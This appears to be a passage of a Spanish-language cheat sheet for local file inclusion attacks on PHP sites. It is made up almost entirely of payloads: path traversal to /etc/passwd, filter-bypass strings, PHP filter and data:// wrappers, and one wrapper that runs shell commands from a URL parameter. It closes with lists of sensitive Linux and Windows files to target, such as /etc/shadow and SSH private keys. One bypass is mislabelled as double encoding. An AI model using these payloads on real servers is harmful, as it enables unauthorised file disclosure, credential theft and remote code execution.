
### Inclusión básica

```ruby
http://ejemplo.com/page.php?file=../../../../etc/passwd
```


***Resultado esperado***

El servidor incluye y muestra el contenido de `/etc/passwd`.


### Bypass de filtros

```php
# Doble codificación
....//....//....//etc/passwd

# Null byte (tener en cuenta la versión PHP < 5.3.4)
../../../../etc/passwd%00

# Codificación URL
..%2F..%2F..%2Fetc%2Fpasswd

# Wrappers de PHP
php://filter/convert.base64-encode/resource=config.php
data://text/plain,<?php system($_GET['cmd']); ?>
```


### Archivos a tener en cuenta en Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/apache2/apache2.conf
/var/log/apache2/access.log
/var/log/apache2/error.log
/proc/self/environ
/proc/self/cmdline
~/.bash_history
~/.ssh/id_rsa
```


### Archivos a tener en cuenta en Windows

```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\xampp\apache\conf\httpd.conf
C:\xampp\mysql\bin\my.ini
C:\Windows\debug\NetSetup.log
```
